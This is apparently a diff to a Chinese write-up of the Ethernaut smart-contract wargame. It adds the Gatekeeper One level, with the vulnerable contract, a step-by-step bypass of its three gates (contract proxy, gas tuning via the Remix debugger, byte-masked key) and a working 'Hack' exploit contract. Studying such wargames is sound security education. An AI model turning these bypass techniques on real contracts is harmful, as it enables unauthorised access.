@@ -847,7 +847,7 @@ contract Privacy {
   bool public locked = true;
 
   // slot 1
-  uint256 public ID = block.timestamp;
+  uint256 public ID = block.timestamp;  // uint256 is 32 bytes long
 
   // slot 2
   uint8 private flattening = 10;
@@ -906,3 +906,108 @@ contract Privacy {
 ### 参考资料
 
 [Accessing Private Data | Solidity by Example](https://solidity-by-example.org/hacks/accessing-private-data/)
+
+## 13. Gatekeeper One
+
+越过守门人并注册为参赛者
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract GatekeeperOne {
+
+  using SafeMath for uint256;
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(gasleft().mod(8191) == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+      // uint64 is 8 bytes long
+      // _gateKey % 2^32 == _gateKey % 2^16
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      // _gateKey % 2^32 != _gateKey
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      // _gateKey % 2^32 == tx.origin % 2^16
+      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+```
+
+- 使用与 [Telephone](#4-telephone) 相同的方式通过 `gateOne`
+- 至于 `gateTwo`，在 Remix 的 JavaScript VM 环境下通过 Debug 来获取具体所需汽油量
+    - **注意**：不同版本的 EVM 或编译器都会导致不同的汽油消耗量
+    - 首先选择一个较大的汽油量，如 `90000`
+    - 执行完成后，进入 `DEBUGGER`，执行到 `mod` 这一步，此时可查看参与模运算两个局部变量的值，其中 `a` 就对应了当前剩余的汽油量，为 `89746`<br>
+![89746](img/ethernaut04.jpg)
+
+    - 由此可计算出通过 `gateTwo` 实际需要的最少汽油量：$90000-89746+8191=8445$
+- 对于 `gateThree`，用 $A_0A_1...A_7$ 来表示 `_gateKey` 的各个字节
+    - `part one` 需满足 $A_4A_5A_6A_7 = A_6A_7$
+    - `part two` 需满足 $A_4A_5A_6A_7 \neq A_0A_1...A_7$
+    - `part three` 需满足 $A_4A_5A_6A_7 = B_6B_7$ （视作 `tx.origin` 后两个字节）
+    - 也就是说，`_gateKey` 只需要后两个字节与 `tx.origin` 一致，倒数三四字节为 $0$，剩下四个字节不为 $0$ 就可以了 >v<
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';
+
+contract GatekeeperOne {
+
+  using SafeMath for uint256;
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(gasleft().mod(8191) == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+
+contract Hack {
+  function exploit(address instance) public {
+    GatekeeperOne gk = GatekeeperOne(instance);
+    bytes8 _gateKey = bytes8(uint64(msg.sender) & 0xff0000ffff);
+    gk.enter{gas: 8445}(_gateKey);
+  }
+}
+```
+
+### 参考资料
+
+- [Solidity variables — storage, type conversions and accessing private variables](https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183)
+- [solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange](https://ethereum.stackexchange.com/questions/84670/why-does-remixs-jsvm-show-incorrect-gas)
